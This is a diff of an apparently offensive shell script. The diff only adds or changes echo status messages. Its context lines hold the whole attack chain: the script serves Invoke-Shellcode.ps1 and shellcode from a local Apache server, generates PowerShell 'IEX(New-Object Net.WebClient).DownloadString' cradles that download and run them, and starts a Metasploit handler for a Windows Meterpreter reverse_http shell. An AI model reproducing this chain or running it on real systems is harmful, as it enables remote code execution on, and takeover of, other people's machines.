@@ -28,12 +28,14 @@ cp Invoke-Shellcode.ps1 /var/www/html/
 cp shellcode.txt /var/www/html/
 echo "Starting Web Server"
 service apache2 start
+echo "Running!"
 echo "Copied to http://"$ip"/Invoke-Shellcode.ps1"
 echo "Generating Script For Powershell..."
 echo 'IEX(New-Object Net.WebClient).DownloadString("http://'$ip:80'/Invoke-Shellcode.ps1")
 IEX(New-Object Net.WebClient).DownloadString("http://'$ip:80'/shellcode.txt")
 Invoke-Shellcode -Shellcode ($buf) -Force' > code.txt
 echo "Saved!"
+echo "Starting the postgresql Server"
 service postgresql start
-echo "Starting Listener"
+echo "Starting Listener for Payload"
 msfconsole -q -x "use exploit/multi/handler;set PAYLOAD windows/meterpreter/reverse_http;set LHOST $ip;set LPORT $port; exploit"
